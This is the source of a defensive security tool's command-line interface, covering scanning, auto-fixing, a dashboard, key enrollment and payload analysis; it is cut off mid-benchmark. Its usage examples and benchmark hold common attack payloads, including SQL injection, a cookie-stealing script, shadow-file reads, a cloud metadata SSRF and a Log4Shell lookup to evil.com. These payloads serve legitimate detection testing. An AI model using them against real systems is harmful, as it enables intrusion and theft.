#!/usr/bin/env node

/**
 * SECURE VERSION: npx @santh/invariant CLI
 * 
 * SECURITY FIXES APPLIED:
 * - All command execution uses spawn with argument arrays (no shell)
 * - Path validation before all file operations
 * - Input sanitization for all user-provided values
 * - Proper cleanup of intervals and resources
 * - No dynamic command construction
 */

import { InvariantAgent } from '../../agent/src/index.js'
import { startDashboard } from '../../dashboard/src/server.js'
import { CodebaseScanner, formatReport, toJunitXml, toSarif } from '../../engine/src/codebase-scanner.js'
import { AutoFixer } from '../../engine/src/auto-fixer.js'
import { UnifiedRuntime } from '../../engine/src/unified-runtime.js'
import { MitreMapper } from '../../engine/src/mitre-mapper.js'
import { join, resolve, relative } from 'node:path'
import { existsSync, readFileSync, statSync, writeFileSync } from 'node:fs'
import { createInterface } from 'node:readline'
import { spawn } from 'node:child_process'
import { toBase64Url, fromBase64Url } from '../../engine/src/crypto/encoding.js'
import type { SignalProductCategory } from '../../engine/src/crypto/types.js'
import type { InvariantConfig } from '../../engine/src/config.js'
import { installPreCommitHook } from './hooks/pre-commit.js'

// ── Constants ────────────────────────────────────────────────────

const VERSION = '1.0.0-SECURE'
const DASHBOARD_PORT = 4444
const ALLOWED_PROTOCOLS = ['http:', 'https:']
const MAX_PATH_LENGTH = 4096

// ── Security Utilities ───────────────────────────────────────────

/**
 * Validate and sanitize a file path to prevent traversal attacks.
 */
function validatePath(inputPath: string, allowedRoot: string): string {
    if (!inputPath || typeof inputPath !== 'string') {
        throw new Error('Invalid path: must be a non-empty string')
    }
    
    if (inputPath.length > MAX_PATH_LENGTH) {
        throw new Error(`Path too long: ${inputPath.length} > ${MAX_PATH_LENGTH}`)
    }
    
    // Resolve to absolute paths
    const resolved = resolve(inputPath)
    const root = resolve(allowedRoot)
    
    // Check if path escapes root
    const rel = relative(root, resolved)
    if (rel.startsWith('..') || resolve(rel).startsWith('..')) {
        throw new Error(`Path escapes allowed directory: ${inputPath}`)
    }
    
    // Check for null bytes
    if (/\x00/.test(resolved)) {
        throw new Error('Path contains null bytes')
    }
    
    return resolved
}

/**
 * Validate URL to prevent command injection.
 */
function validateUrl(url: string): string {
    try {
        const parsed = new URL(url)
        
        if (!ALLOWED_PROTOCOLS.includes(parsed.protocol)) {
            throw new Error(`Invalid protocol: ${parsed.protocol}`)
        }
        
        // Prevent shell metacharacters in hostname/path
        if (/[;&|`$]/.test(parsed.hostname) || /[;&|`$]/.test(parsed.pathname)) {
            throw new Error('URL contains shell metacharacters')
        }
        
        return url
    } catch (err) {
        throw new Error(`Invalid URL: ${err instanceof Error ? err.message : 'unknown error'}`)
    }
}

/**
 * Sanitize environment variable values for command execution.
 */
function sanitizeEnvValue(value: string): string {
    // Remove shell metacharacters
    return value.replace(/[;&|`$(){}[\]\\\n\r]/g, '_')
}

/**
 * Validate mode parameter.
 */
function validateMode(mode: string): 'monitor' | 'enforce' {
    if (mode !== 'monitor' && mode !== 'enforce') {
        throw new Error(`Invalid mode: ${mode}. Must be 'monitor' or 'enforce'`)
    }
    return mode
}

/**
 * Validate URL for signal ingestion.
 */
function validateIngestUrl(url: string): string {
    if (!url) return ''
    
    try {
        const parsed = new URL(url)
        if (!ALLOWED_PROTOCOLS.includes(parsed.protocol)) {
            throw new Error('Ingest URL must use http or https')
        }
        return url
    } catch {
        throw new Error('Invalid ingest URL')
    }
}

// ── Helpers ──────────────────────────────────────────────────────

function logo(): void {
    console.log('')
    console.log('  ██╗███╗   ██╗██╗   ██╗ █████╗ ██████╗ ██╗ █████╗ ███╗   ██╗████████╗')
    console.log('  ██║████╗  ██║██║   ██║██╔══██╗██╔══██╗██║██╔══██╗████╗  ██║╚══██╔══╝')
    console.log('  ██║██╔██╗ ██║██║   ██║███████║██████╔╝██║███████║██╔██╗ ██║   ██║   ')
    console.log('  ██║██║╚██╗██║╚██╗ ██╔╝██╔══██║██╔══██╗██║██╔══██║██║╚██╗██║   ██║   ')
    console.log('  ██║██║ ╚████║ ╚████╔╝ ██║  ██║██║  ██║██║██║  ██║██║ ╚████║   ██║   ')
    console.log('  ╚═╝╚═╝  ╚═══╝  ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ')
    console.log('')
    console.log(`  Full-Stack Automated Defense                           v${VERSION}`)
    console.log('  ─────────────────────────────────────────────────────────────────')
    console.log('')
}

function ask(question: string): Promise<string> {
    const rl = createInterface({ input: process.stdin, output: process.stdout })
    return new Promise(resolve => {
        rl.question(`  ${question} `, answer => {
            rl.close()
            resolve(answer.trim())
        })
    })
}

function detectFramework(projectDir: string): string {
    let pkgPath: string
    try {
        pkgPath = validatePath(join(projectDir, 'package.json'), projectDir)
    } catch {
        return 'unknown'
    }
    
    if (!existsSync(pkgPath)) return 'unknown'

    const pkg = JSON.parse(readFileSync(pkgPath, 'utf-8'))
    const deps = { ...pkg.dependencies, ...pkg.devDependencies }

    if (deps['next']) return 'Next.js'
    if (deps['nuxt']) return 'Nuxt'
    if (deps['express']) return 'Express'
    if (deps['fastify']) return 'Fastify'
    if (deps['koa']) return 'Koa'
    if (deps['hono']) return 'Hono'
    if (deps['@nestjs/core']) return 'NestJS'
    if (deps['react']) return 'React'
    if (deps['vue']) return 'Vue'
    if (deps['svelte']) return 'Svelte'
    if (deps['astro']) return 'Astro'
    return 'Node.js'
}

function detectDatabaseDriver(projectDir: string): string | null {
    let pkgPath: string
    try {
        pkgPath = validatePath(join(projectDir, 'package.json'), projectDir)
    } catch {
        return null
    }
    
    if (!existsSync(pkgPath)) return null

    const pkg = JSON.parse(readFileSync(pkgPath, 'utf-8'))
    const deps = { ...pkg.dependencies, ...pkg.devDependencies }

    if (deps['pg'] || deps['@vercel/postgres']) return 'PostgreSQL (pg)'
    if (deps['mysql2']) return 'MySQL (mysql2)'
    if (deps['better-sqlite3'] || deps['sqlite3']) return 'SQLite'
    if (deps['mongoose'] || deps['mongodb']) return 'MongoDB'
    if (deps['@prisma/client']) return 'Prisma'
    if (deps['drizzle-orm']) return 'Drizzle'
    if (deps['typeorm']) return 'TypeORM'
    if (deps['sequelize']) return 'Sequelize'
    return null
}

type CodeScanOutputFormat = 'human' | 'sarif' | 'junit'

function parseCodeScanFormat(args: string[]): CodeScanOutputFormat {
    for (let i = 0; i < args.length; i += 1) {
        const arg = args[i]
        if (arg === '--format') {
            const raw = args[i + 1]
            return parseFormatValue(raw)
        }

        if (arg.startsWith('--format=')) {
            return parseFormatValue(arg.slice('--format='.length))
        }
    }

    return 'human'
}

function parseFormatValue(raw: string | undefined): CodeScanOutputFormat {
    const value = (raw ?? '').toLowerCase()
    if (value === 'sarif' || value === 'junit') {
        return value
    }

    return 'human'
}

// ── Commands ─────────────────────────────────────────────────────

async function commandScan(projectDir: string): Promise<void> {
    console.log('  Scanning...\n')

    const agent = new InvariantAgent({
        projectDir,
        mode: 'observe',
        scanOnStart: true,
        auditOnStart: true,
        verbose: true,
    })

    await agent.start()

    const status = agent.getStatus()
    console.log('')
    console.log('  ┌────────────────────────────────────────┐')
    console.log(`  │  Findings: ${String(status.findings.total).padEnd(28)}│`)
    console.log(`  │    Critical: ${String(status.findings.critical).padEnd(26)}│`)
    console.log(`  │    High:     ${String(status.findings.high).padEnd(26)}│`)
    console.log('  └────────────────────────────────────────┘')
    console.log('')

    if (status.findings.total > 0) {
        console.log('  Run `npx @santh/invariant dashboard` to see details.')
    } else {
        console.log('  ✓ No vulnerabilities found.')
    }

    const codebaseScanner = new CodebaseScanner({ rootDir: projectDir })
    const codebaseResult = codebaseScanner.scanDirectory()
    console.log('')
    console.log('  Invariant Codebase Scanner')
    console.log(formatReport(codebaseResult))

    agent.stop()
}

async function commandCodeScan(projectDir: string, rawArgs: string[]): Promise<void> {
    const format = parseCodeScanFormat(rawArgs)

    console.log('  Scanning source code...')
    const codebaseScanner = new CodebaseScanner({ rootDir: projectDir })
    const result = codebaseScanner.scanDirectory()

    if (format === 'sarif') {
        console.log(JSON.stringify(toSarif(result), null, 2))
        return
    }

    if (format === 'junit') {
        console.log(toJunitXml(result))
        return
    }

    console.log('')
    console.log(formatReport(result))
}

async function commandFix(projectDir: string): Promise<void> {
    console.log('  Scanning source code for auto-fix candidates...')

    const codebaseScanner = new CodebaseScanner({ rootDir: projectDir })
    const scanResult = codebaseScanner.scanDirectory()
    const fixer = new AutoFixer(projectDir)
    const allFixes = fixer.generateFixes(scanResult.findings)
    const fixable = allFixes.filter((fix) => fix.fixed !== fix.original)

    if (fixable.length === 0) {
        console.log('  No safe automatic fixes available.')
        return
    }

    console.log(`\n  Found ${fixable.length} fixable vulnerabilities:`)
    for (const fix of fixable) {
        console.log(`\n  ${fix.file}:${fix.line} [${fix.category}]`)
        console.log(`  - ${fix.original.trim()}`)
        console.log(`  + ${fix.fixed.trim()}`)
    }
    console.log('')

    const confirmation = await ask('Apply fixes and commit? [y/N]:')
    const approved = confirmation.toLowerCase() === 'y' || confirmation.toLowerCase() === 'yes'
    if (!approved) {
        console.log('  Aborted. No changes applied.')
        return
    }

    const applied = fixer.applyFixes(fixable)
    const appliedCount = applied.filter((fix) => fix.applied).length
    const commitHash = fixer.atomicCommit(applied)

    if (!commitHash) {
        console.log('  Failed to create atomic commit. Changes were rolled back.')
        return
    }

    console.log(`  Applied ${appliedCount} fixes. Commit: ${commitHash}. To revert: git revert ${commitHash}`)
}

async function commandRevert(projectDir: string, commitHashArg?: string): Promise<void> {
    const hash = (commitHashArg ?? await ask('Commit hash to revert:')).trim()
    if (!hash) {
        console.log('  No commit hash provided.')
        return
    }

    const fixer = new AutoFixer(projectDir)
    const reverted = fixer.revert(hash)
    if (reverted) {
        console.log(`  Reverted commit ${hash}.`)
        return
    }

    console.log(`  Failed to revert commit ${hash}.`)
}

async function commandDashboard(projectDir: string): Promise<void> {
    let dbPath: string
    try {
        dbPath = validatePath(join(projectDir, 'invariant.db'), projectDir)
    } catch (err) {
        console.error('  Invalid database path:', err)
        return
    }

    if (!existsSync(dbPath)) {
        console.log('  No invariant.db found. Running initial scan first...\n')
        await commandScan(projectDir)
    }

    const dashboard = startDashboard(dbPath, DASHBOARD_PORT)

    // Open browser securely using spawn (no shell)
    const openUrl = `http://localhost:${DASHBOARD_PORT}`
    try {
        let cmd: string
        let args: string[]
        
        if (process.platform === 'win32') {
            cmd = 'start'
            args = ['', openUrl]  // Empty first arg for Windows start
        } else if (process.platform === 'darwin') {
            cmd = 'open'
            args = [openUrl]
        } else {
            cmd = 'xdg-open'
            args = [openUrl]
        }
        
        // Use spawn without shell to prevent injection
        const child = spawn(cmd, args, { 
            detached: true,
            stdio: 'ignore',
            shell: false,  // CRITICAL: No shell interpretation
        })
        child.unref()
    } catch { /* browser open failed, user can navigate manually */ }

    // Handle shutdown
    process.on('SIGINT', () => {
        console.log('\n  Shutting down dashboard...')
        dashboard.close()
        process.exit(0)
    })
}

async function commandStatus(projectDir: string): Promise<void> {
    let dbPath: string
    try {
        dbPath = validatePath(join(projectDir, 'invariant.db'), projectDir)
    } catch (err) {
        console.error('  Invalid database path:', err)
        return
    }
    
    if (!existsSync(dbPath)) {
        console.log('  No invariant.db found. Run `npx @santh/invariant scan` first.')
        return
    }

    const agent = new InvariantAgent({ projectDir, scanOnStart: false, auditOnStart: false })
    const status = agent.getStatus()

    console.log('  ┌────────────────────────────────────────┐')
    console.log(`  │  Mode:       ${status.mode.padEnd(26)}│`)
    console.log(`  │  Findings:   ${String(status.findings.total).padEnd(26)}│`)
    console.log(`  │    Critical: ${String(status.findings.critical).padEnd(26)}│`)
    console.log(`  │    High:     ${String(status.findings.high).padEnd(26)}│`)
    console.log(`  │    Open:     ${String(status.findings.open).padEnd(26)}│`)
    console.log(`  │  Signals:    ${String(status.signals.total).padEnd(26)}│`)
    console.log(`  │    Blocked:  ${String(status.signals.blocked).padEnd(26)}│`)
    console.log(`  │  Last scan:  ${(status.lastScan ?? 'never').padEnd(26)}│`)
    console.log('  └────────────────────────────────────────┘')

    agent.stop()
}

function isSignalProductCategory(value: string): value is SignalProductCategory {
    return [
        'saas',
        'api',
        'ecommerce',
        'fintech',
        'healthcare',
        'content',
        'devtools',
        'gaming',
        'education',
        'government',
        'other',
    ].includes(value)
}

async function commandConfig(projectDir: string): Promise<void> {
    let dbPath: string
    try {
        dbPath = validatePath(join(projectDir, 'invariant.db'), projectDir)
    } catch (err) {
        console.error('  Invalid database path:', err)
        return
    }

    if (!existsSync(dbPath)) {
        console.log('  No invariant.db found. Run `npx @santh/invariant init` first.')
        return
    }

    const { InvariantDB } = await import('../../agent/src/db.js')
    const db = new InvariantDB(dbPath)

    try {
        const assets = db.getAllAssets()
        const mode = db.getConfig('mode') ?? 'observe'
        const configuredProjectDir = db.getConfig('project_dir') ?? projectDir

        console.log('  Current configuration')
        console.log('  ┌────────────────────────────────────────┐')
        console.log(`  │  Database:   ${'invariant.db'.padEnd(26)}│`)
        console.log(`  │  Project:    ${configuredProjectDir.padEnd(26)}│`)
        console.log(`  │  Mode:       ${mode.padEnd(26)}│`)
        console.log(`  │  App type:   ${(assets['app.type'] ?? 'not set').padEnd(26)}│`)
        console.log(`  │  Category:   ${(assets['app.category'] ?? 'not set').padEnd(26)}│`)
        console.log(`  │  Framework:  ${(assets['app.framework'] ?? 'not set').padEnd(26)}│`)
        console.log(`  │  Data:       ${(assets['app.data_classification'] ?? 'not set').padEnd(26)}│`)
        console.log(`  │  Compliance: ${(assets['app.compliance'] ?? 'not set').padEnd(26)}│`)
        console.log(`  │  Database:   ${(assets['app.database'] ?? 'not set').padEnd(26)}│`)
        console.log('  └────────────────────────────────────────┘')
    } finally {
        db.close()
    }
}

function commandHooks(projectDir: string): void {
    try {
        installPreCommitHook(projectDir)
        console.log('  ✓ Installed pre-commit hook at .git/hooks/pre-commit')
    } catch (error) {
        const message = error instanceof Error ? error.message : String(error)
        console.error(`  Failed to install pre-commit hook: ${message}`)
        process.exit(1)
    }
}

// Offset of the raw key in a PKCS8 v0 X25519 export from Web Crypto.
// Layout: 30 2e 02 01 00 30 05 06 03 2b 65 6e 04 22 04 20 <32 raw bytes>
// = 16-byte header + 32-byte raw key. Verified against Node.js 20/22/25.
// The edge sensor wraps the raw key back into PKCS8 before importing.
const PKCS8_X25519_RAW_KEY_OFFSET = 16

/**
 * Generate a subscriber X25519 keypair and optionally upload the private key
 * as a Cloudflare Worker Secret via wrangler.
 *
 * This is the central enrollment step for INVARIANT collective intelligence.
 * The public key is registered with Santh central (account.santh.io/enroll).
 * The private key never leaves the subscriber's CF Worker Secrets store —
 * it is not transmitted to Santh, not stored in this CLI, and not committed
 * to version control.
 */
async function commandKeypair(projectDir: string, autoUpload = false): Promise<void> {
    console.log('  ── Subscriber Keypair Generation ─────────────────────────')
    console.log('  Generating X25519 keypair for collective intelligence enrollment...\n')

    // Use globalThis.crypto (Web Crypto) — available in Node.js 20+
    const keypair = await globalThis.crypto.subtle.generateKey(
        { name: 'X25519' },
        true, // extractable
        ['deriveBits'],
    )

    // Export public key as raw bytes → base64url
    const publicKeyRaw = new Uint8Array(
        await globalThis.crypto.subtle.exportKey('raw', keypair.publicKey)
    )
    const publicKeyB64 = toBase64Url(publicKeyRaw)

    // Export private key as PKCS8, then strip the ASN.1 header to get raw 32 bytes.
    // CF Secrets stores the raw key. The edge sensor wraps it back in PKCS8 on import.
    const pkcs8Bytes = new Uint8Array(
        await globalThis.crypto.subtle.exportKey('pkcs8', keypair.privateKey)
    )
    const rawPrivateKey = pkcs8Bytes.slice(PKCS8_X25519_RAW_KEY_OFFSET)
    if (rawPrivateKey.length !== 32) {
        throw new Error(`Unexpected private key length after stripping PKCS8 header: ${rawPrivateKey.length}. Expected 32. Run on Node.js 20+.`)
    }
    const privateKeyB64 = toBase64Url(rawPrivateKey)

    // Write public key to a file that can be committed and shared with Santh
    const pubKeyFile = join(projectDir, 'invariant-pubkey.txt')
    writeFileSync(pubKeyFile, publicKeyB64 + '\n', 'utf-8')

    console.log('  ┌────────────────────────────────────────────────────────────┐')
    console.log('  │  Subscriber public key (safe to share — register with Santh)│')
    console.log('  │                                                            │')
    console.log(`  │  ${publicKeyB64.padEnd(58)}  │`)
    console.log('  │                                                            │')
    console.log('  │  Saved to: invariant-pubkey.txt                            │')
    console.log('  └────────────────────────────────────────────────────────────┘')
    console.log('')
    console.log('  Next step: Register this key at https://account.santh.io/enroll')
    console.log('  Santh will provide your SANTH_RULE_VERIFY_KEY and SANTH_SIGNAL_ENCRYPT_KEY.')
    console.log('')

    let shouldUpload = autoUpload
    if (!autoUpload) {
        const answer = await ask('Upload private key as wrangler secret now? [y/N]:')
        shouldUpload = answer.toLowerCase() === 'y' || answer.toLowerCase() === 'yes'
    }

    if (shouldUpload) {
        console.log('\n  Uploading SUBSCRIBER_PRIVATE_KEY via wrangler secret put...')
        try {
            await new Promise<void>((resolve, reject) => {
                // Pipe the key via stdin to avoid it appearing in process list or shell history
                const child = spawn('npx', ['wrangler', 'secret', 'put', 'SUBSCRIBER_PRIVATE_KEY'], {
                    cwd: projectDir,
                    stdio: ['pipe', 'inherit', 'inherit'],
                    shell: false,
                })
                child.stdin?.write(privateKeyB64 + '\n')
                child.stdin?.end()
                child.on('close', code => code === 0 ? resolve() : reject(new Error(`exit ${code}`)))
                child.on('error', reject)
            })
            console.log('  ✓ SUBSCRIBER_PRIVATE_KEY uploaded to Cloudflare Worker Secrets.')
        } catch (err) {
            console.log('  ✗ wrangler secret put failed:', err instanceof Error ? err.message : err)
            console.log('')
            console.log('  Manual upload (run in edge-sensor directory):')
            console.log(`    echo "${privateKeyB64}" | wrangler secret put SUBSCRIBER_PRIVATE_KEY`)
        }
    } else {
        console.log('  Private key (set this via wrangler secret put SUBSCRIBER_PRIVATE_KEY):')
        console.log(`  ${privateKeyB64}`)
        console.log('')
        console.log('  ⚠  Store this securely — it cannot be recovered if lost.')
        console.log('  ⚠  Do NOT commit it to version control.')
    }

    console.log('')
    console.log('  Once enrolled, set remaining secrets in your CF Worker:')
    console.log('    wrangler secret put SANTH_RULE_VERIFY_KEY')
    console.log('    wrangler secret put SANTH_SIGNAL_ENCRYPT_KEY')
    console.log('    wrangler secret put INVARIANT_STORAGE_KEY  # optional, for at-rest encryption')
}

async function commandInit(projectDir: string): Promise<void> {
    logo()

    // Detect project
    const framework = detectFramework(projectDir)
    const dbDriver = detectDatabaseDriver(projectDir)

    console.log(`  Detected: ${framework}`)
    if (dbDriver) console.log(`  Database: ${dbDriver}`)
    console.log('')

    // Startup questions
    const appType = await ask('What type of application? [web/api/saas/internal] (web):') || 'web'
    const dataType = await ask('What data do you handle? [pii/payment/health/none] (none):') || 'none'
    const compliance = await ask('Compliance requirements? [soc2/hipaa/pci/gdpr/none] (none):') || 'none'
    const categoryInput = await ask('Product category? [saas/api/ecommerce/fintech/healthcare/content/devtools/gaming/education/government/other] (saas):') || 'saas'
    const category: SignalProductCategory = isSignalProductCategory(categoryInput) ? categoryInput : 'saas'
    console.log('')

    // Initialize agent
    console.log('  Initializing INVARIANT...\n')

    const agent = new InvariantAgent({
        projectDir,
        mode: 'observe',
        scanOnStart: true,
        auditOnStart: true,
        verbose: true,
    })

    // Store asset model
    const db = agent.getDB()
    db.setAsset('app.type', appType)
    db.setAsset('app.framework', framework)
    db.setAsset('app.data_classification', dataType)
    db.setAsset('app.compliance', compliance)
    db.setAsset('app.category', category)
    if (dbDriver) db.setAsset('app.database', dbDriver)

    await agent.start()

    // Write invariant.config.json — the single source of truth read by agent + edge sensor
    const configObj: InvariantConfig = {
        v: 1,
        category: category as InvariantConfig['category'],
        framework,
        mode: 'monitor',
        appType: appType as InvariantConfig['appType'],
        dataClassification: dataType as InvariantConfig['dataClassification'],
        compliance: compliance === 'none' ? [] : compliance.split(',').map(c => c.trim()),
        ...(dbDriver ? { database: dbDriver } : {}),
    }
    const configPath = join(projectDir, 'invariant.config.json')
    writeFileSync(configPath, JSON.stringify(configObj, null, 2) + '\n', 'utf-8')

    const status = agent.getStatus()
    console.log('')
    console.log('  ═══════════════════════════════════════════════')
    console.log('  INVARIANT initialized successfully.')
    console.log('')
    console.log(`  Findings:    ${status.findings.total} (${status.findings.critical} critical, ${status.findings.high} high)`)
    console.log(`  Config:      invariant.config.json (commit this)`)
    console.log(`  Database:    invariant.db (${projectDir})`)
    console.log(`  Mode:        observe (safe — monitoring only)`)
    console.log(`  Category:    ${category}`)
    console.log('')
    console.log('  Next steps:')
    console.log('    npx @santh/invariant dashboard   — view findings')
    console.log('    npx @santh/invariant keys        — generate subscriber keypair (collective intel)')
    console.log('    npx @santh/invariant deploy       — deploy edge sensor')
    console.log('')
    console.log('  Add to your app:')
    console.log("    import { invariantMiddleware } from '@santh/agent/middleware/express'")
    console.log('    app.use(invariantMiddleware())')
    console.log('')
    console.log('  ═══════════════════════════════════════════════')

    agent.stop()
}

// ── Analyze Command ──────────────────────────────────────────────

async function commandAnalyze(args: string[]): Promise<void> {
    const input = args[1]
    if (!input) {
        console.log('  Usage: npx @santh/invariant analyze <payload> [--context sql|html|shell|...] [--param <name>] [--json]')
        console.log('')
        console.log('  Examples:')
        console.log("    npx @santh/invariant analyze \"' OR 1=1--\"")
        console.log('    npx @santh/invariant analyze "<script>alert(1)</script>" --context html')
        console.log('    npx @santh/invariant analyze "1 UNION SELECT *" --param page --json')
        return
    }

    // Parse flags
    let context: string | undefined
    let paramName: string | undefined
    let jsonOutput = false
    for (let i = 2; i < args.length; i++) {
        if (args[i] === '--context' && args[i + 1]) { context = args[++i] }
        else if (args[i] === '--param' && args[i + 1]) { paramName = args[++i] }
        else if (args[i] === '--json') { jsonOutput = true }
    }

    const runtime = new UnifiedRuntime()
    const result = runtime.processSync({
        input,
        sourceHash: 'cli_analyze',
        request: { method: 'POST', path: '/cli/analyze' },
        knownContext: context,
        paramName,
    })

    if (jsonOutput) {
        console.log(JSON.stringify({
            decision: result.decision,
            matches: result.analysis.matches.map(m => ({
                class: m.class,
                confidence: m.confidence,
                severity: m.severity,
                category: m.category,
                description: m.description,
                convergent: m.detectionLevels?.convergent,
                l2Evidence: m.l2Evidence,
            })),
            effect: result.effectSimulation ? {
                operation: result.effectSimulation.operation,
                proof: result.effectSimulation.proof,
                impact: result.effectSimulation.impact,
                preconditions: result.effectSimulation.preconditions,
            } : null,
            adversary: result.adversaryFingerprint,
            shape: result.shapeValidation,
            intent: result.analysis.intent,
            polyglot: result.analysis.polyglot,
            mitre: result.mitreTechniques,
            chains: result.chainMatches,
            responsePlan: result.responsePlan,
        }, null, 2))
        return
    }

    // Human-readable output
    console.log('')
    console.log('  ┌──────────────────────────────────────────────────────────┐')
    console.log(`  │  INVARIANT Analysis Report                               │`)
    console.log('  └──────────────────────────────────────────────────────────┘')
    console.log('')

    // Decision
    const actionColors: Record<string, string> = {
        block: '\x1b[31m', lockdown: '\x1b[31m', challenge: '\x1b[33m',
        throttle: '\x1b[33m', monitor: '\x1b[36m', allow: '\x1b[32m',
    }
    const color = actionColors[result.decision.action] ?? ''
    const reset = '\x1b[0m'
    console.log(`  Decision:    ${color}${result.decision.action.toUpperCase()}${reset}`)
    console.log(`  Confidence:  ${(result.decision.confidence * 100).toFixed(1)}%`)
    console.log(`  Reason:      ${result.decision.reason}`)
    if (result.decision.alert) console.log(`  Alert:       \x1b[31mYES\x1b[0m`)
    console.log('')

    // Matches
    if (result.analysis.matches.length > 0) {
        console.log('  Detections:')
        for (const m of result.analysis.matches) {
            const sevColor = m.severity === 'critical' ? '\x1b[31m' : m.severity === 'high' ? '\x1b[33m' : '\x1b[36m'
            console.log(`    ${sevColor}[${m.severity}]${reset} ${m.class} (${(m.confidence * 100).toFixed(1)}%)`)
            if (m.detectionLevels?.convergent) console.log('          ↳ convergent (L1+L2 agree)')
            if (m.l2Evidence) console.log(`          ↳ ${m.l2Evidence}`)
        }
        console.log('')
    } else {
        console.log('  No detections.\n')
    }

    // Intent
    if (result.analysis.intent && result.analysis.intent.primaryIntent !== 'unknown') {
        console.log(`  Intent:      ${result.analysis.intent.detail}`)
        if (result.analysis.intent.targets.length > 0) {
            console.log(`  Targets:     ${result.analysis.intent.targets.join(', ')}`)
        }
        console.log('')
    }

    // Effect simulation
    if (result.effectSimulation) {
        console.log('  Effect Simulation:')
        console.log(`    Operation:  ${result.effectSimulation.operation}`)
        console.log(`    Impact:     ${result.effectSimulation.impact.baseScore.toFixed(1)}/10.0`)
        console.log(`    CIA:        C=${result.effectSimulation.impact.confidentiality.toFixed(1)} I=${result.effectSimulation.impact.integrity.toFixed(1)} A=${result.effectSimulation.impact.availability.toFixed(1)}`)
        console.log(`    Exposure:   ${result.effectSimulation.impact.exposureEstimate}`)
        if (result.effectSimulation.proof.isComplete) {
            console.log(`    Proof:      \x1b[32mCOMPLETE\x1b[0m — ${result.effectSimulation.proof.statement}`)
        } else {
            console.log(`    Proof:      PARTIAL — ${result.effectSimulation.proof.statement}`)
        }
        if (result.effectSimulation.preconditions.length > 0) {
            console.log(`    Requires:   ${result.effectSimulation.preconditions.join('; ')}`)
        }
        console.log('')
    }

    // Adversary fingerprint
    if (result.adversaryFingerprint) {
        console.log('  Adversary Profile:')
        console.log(`    Tool:       ${result.adversaryFingerprint.tool}`)
        console.log(`    Skill:      ${result.adversaryFingerprint.skillLevel}`)
        console.log(`    Automated:  ${result.adversaryFingerprint.automated ? 'YES' : 'no'}`)
        for (const ind of result.adversaryFingerprint.indicators) {
            console.log(`    Indicator:  ${ind}`)
        }
        console.log('')
    }

    // Shape validation
    if (result.shapeValidation) {
        if (!result.shapeValidation.matches) {
            console.log(`  Shape:       \x1b[31mVIOLATION\x1b[0m — deviation ${(result.shapeValidation.deviation * 100).toFixed(0)}% from expected ${paramName} shape`)
            for (const v of result.shapeValidation.violations) {
                console.log(`    ↳ ${v.constraint}: ${v.message}`)
            }
        } else {
            console.log(`  Shape:       \x1b[32mOK\x1b[0m — input matches expected ${paramName} shape`)
        }
        console.log('')
    }

    // Polyglot
    if (result.analysis.polyglot?.isPolyglot) {
        console.log(`  Polyglot:    ${result.analysis.polyglot.detail}`)
        console.log('')
    }

    // MITRE
    if (result.mitreTechniques.length > 0) {
        console.log(`  MITRE:       ${result.mitreTechniques.join(', ')}`)
        console.log('')
    }

    // Response plan
    if (result.responsePlan && result.responsePlan.recommendations.length > 0) {
        console.log('  Response Plan:')
        console.log(`    Blast Radius: ${result.responsePlan.blastRadius}`)
        if (result.responsePlan.requiresHuman) {
            console.log('    \x1b[31mREQUIRES IMMEDIATE HUMAN ATTENTION\x1b[0m')
        }
        console.log('')
        for (const rec of result.responsePlan.recommendations) {
            const urgencyColor = rec.urgency === 'immediate' ? '\x1b[31m' :
                rec.urgency === 'within_1h' ? '\x1b[33m' : '\x1b[36m'
            console.log(`    ${urgencyColor}[${rec.urgency}]${reset} [${rec.category}] ${rec.action}`)
            if (rec.steps && rec.steps.length > 0) {
                for (const step of rec.steps.slice(0, 3)) {
                    console.log(`      → ${step}`)
                }
                if (rec.steps.length > 3) {
                    console.log(`      ... and ${rec.steps.length - 3} more steps`)
                }
            }
        }
        console.log('')
    }

    // Stats footer
    const stats = runtime.getStats()
    console.log(`  ── ${stats.classCount} classes | ${(stats.l2Coverage * 100).toFixed(0)}% L2 | ${stats.chainDefinitions} chains ──`)
}

// ── Benchmark Command ───────────────────────────────────────────

function commandBenchmark(): void {
    const runtime = new UnifiedRuntime()
    const stats = runtime.getStats()

    console.log('')
    console.log('  INVARIANT Engine Benchmark')
    console.log('  ═══════════════════════════════════════════════\n')
    console.log(`  Classes:       ${stats.classCount}`)
    console.log(`  L2 Coverage:   ${(stats.l2Coverage * 100).toFixed(0)}%`)
    console.log(`  Chain Defs:    ${stats.chainDefinitions}`)
    console.log(`  CVE Graph:     ${stats.knowledgeGraphEntries} entries`)
    console.log('')

    // Benchmark: clean input latency
    const cleanPayloads = [
        'hello world',
        'user@example.com',
        'John Smith',
        'SELECT id FROM products WHERE price > 100',
        'The quick brown fox jumps over the lazy dog',
    ]
    const iterations = 100
    const cleanStart = performance.now()
    for (let i = 0; i < iterations; i++) {
        for (const p of cleanPayloads) {
            runtime.processSync({
                input: p,
                sourceHash: 'bench',
                request: { method: 'GET', path: '/api' },
            })
        }
    }
    const cleanTime = performance.now() - cleanStart
    const cleanPerOp = (cleanTime / (iterations * cleanPayloads.length) * 1000).toFixed(0)
    console.log(`  Clean input:   ${cleanPerOp}µs/op (${iterations * cleanPayloads.length} ops)`)

    // Benchmark: attack payloads
    const attackPayloads = [
        "' OR 1=1--",
        "<script>alert(document.cookie)</script>",
        "../../etc/passwd",
        "; cat /etc/shadow",
        "http://169.254.169.254/latest/meta-data/",
        "{{7*7}}",
        '{"$gt":""}',
        "${jndi:ldap://evil.com/a}",
    ]
    const attackStart = performance.now()
    for (let i = 0; i < iterations; i++) {
        for (const p of attackPayloads) {
            runtime.processSync({
                input: p,
                sourceHash: 'bench_atk',
                request: { method: 'POST', path: '/api' },
            })
        }
    }
    const attackTime = performance.now() - attackStart
    const attackPerOp = (attackTime / (iterations * attackPayloads.length) * 1000).toFixed(0)
    console.log(`  Attack input:  ${attackPerOp}µs/op (${iterations * attackPayloads.length} ops)`)

    // Detection accuracy
    console.log('')
    console.log('  Detection Coverage:')
    let detected = 0
    for (const p of attackPayloads) {
        const r = runtime.processSync({
            input: p,
            sourceHash: 'bench_acc',
            request: { method: 'POST', path: '/api' },
        })
        if (r.analysis.matches.length > 0) {
            detected++
            console.log(`    ✓ ${p.slice(0, 50).padEnd(52)} → ${r.analysis.matches[0].class} (${(r.analysis.matches[0].confidence * 100).toFixed(0)}%)`)
        } else {
            console.log(`    ✗ ${p.slice(0, 50).padEnd(52)} → MISSED`)
        }
    }
